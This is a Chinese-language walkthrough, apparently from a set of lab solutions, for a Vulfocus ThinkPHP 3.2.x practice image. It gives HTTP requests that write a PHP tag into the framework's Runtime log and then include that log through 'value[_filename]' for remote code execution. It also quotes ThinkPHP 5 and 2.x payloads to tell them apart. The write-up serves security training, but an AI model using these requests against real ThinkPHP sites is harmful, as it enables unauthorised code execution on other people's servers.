# 232｜ThinkPHP 3.2.x 日志包含 RCE（无 CVE）

- 镜像：`vulfocus/thinkphp-3.2.x`
- 题库端口：`80,3306`。HTTP 走 **80**。无 CVE。
- **校正：**本题不是 ThinkPHP 5 的 `invokefunction` / `_method=__construct&filter[]=system`，也不是 Vulhub **2.x** 的 `preg_replace /e`（`?s=/index/index/name/${@phpinfo()}`）。Vulfocus 题解走的是 **3.2.x：先把 PHP 写进 Runtime 日志，再 `value[_filename]` 包含该日志**。[S1][S2][S4][S5]

## 一句话打法

业务里 `assign` 第一个参数可控时，`Storage::load` 会 `extract` 覆盖 `$_filename` 再 `include`；先用异常日志记下 `<?php ...?>`，再指向当天日志文件。[S2][S3]

## 操作步骤

1. 打开映射到 `80` 的站点，确认是 ThinkPHP 3 应用（入口 `index.php`）。不要发 5.x 的 `?s=captcha` + `_method=__construct`。[S4][S5]

2. 把 PHP 写入日志。公开 Vulfocus/通用 PoC 用会记入 URL 的参数（`--><?=` 用来避开日志里的注释）：[S2][S3]

   ```http
   GET /index.php?m=Home&c=Index&a=index&test=--><?=phpinfo();?> HTTP/1.1
   ```

   debug 关闭时日志常在 `Application/Runtime/Logs/Common/YY_MM_DD.log`；开启时常在 `Logs/Home/`。日期按服务器当天（示例 `22_08_06`）。[S1][S2]

3. 包含日志。3.2.2/3.2.3 用 **`value[_filename]`**（3.2/3.2.1 有文写 `value[filename]` 无下划线）：[S1][S2][S3]

   ```http
   GET /index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/YY_MM_DD.log HTTP/1.1
   ```

   成功信号是响应出现 `phpinfo()`。Vulfocus 通关文用 Common 目录 + 当天日期。[S1]

## 本题特有排坑

- **不要套 TP5**：`/index.php?s=index/think\app/invokefunction` 或 `filter[]=system` 是 5.0.x。Vulhub 5.0.23 与本题镜像不是同一题。[S5]
- **不要套 TP2 `/e`**：`?s=/index/index/name/${@phpinfo()}` 是 2.x，以及 3.0 **Lite 模式**未修的同一 preg_replace。3.2.x 默认不是这条。[S4]
- `S()` 缓存换行写 `Runtime/Temp/<md5>.php` 需要应用调用 `S($name, $user)`，不是 Vulfocus 已证实的默认入口，不要当本题唯一打法。[S6]
- `assign` 第一参数必须可控；Vulfocus 题解表明该镜像的 `Home/Index/index` 满足。日志路径/日期不对就 include 不到。[S1][S2]

## 来源

- [S1] Vulfocus 通关：Common 日志 + `_filename`。详见[来源清单](../sources/232_thinkphp3.2.x/_meta.md)。
- [S2] 同镜像/同题 CSDN：写日志再包含。详见[来源清单](../sources/232_thinkphp3.2.x/_meta.md)。
- [S3] 玄甲通报：`assign` → `extract`/`include`。详见[来源清单](../sources/232_thinkphp3.2.x/_meta.md)。
- [S4] Vulhub 2.x：明确是 preg_replace `/e`，不是 3.2。详见[来源清单](../sources/232_thinkphp3.2.x/_meta.md)。
- [S5] Vulhub 5.0.23：`invokefunction`/`__construct`。详见[来源清单](../sources/232_thinkphp3.2.x/_meta.md)。
- [S6] `S()` 缓存链（仅作区分）。详见[来源清单](../sources/232_thinkphp3.2.x/_meta.md)。
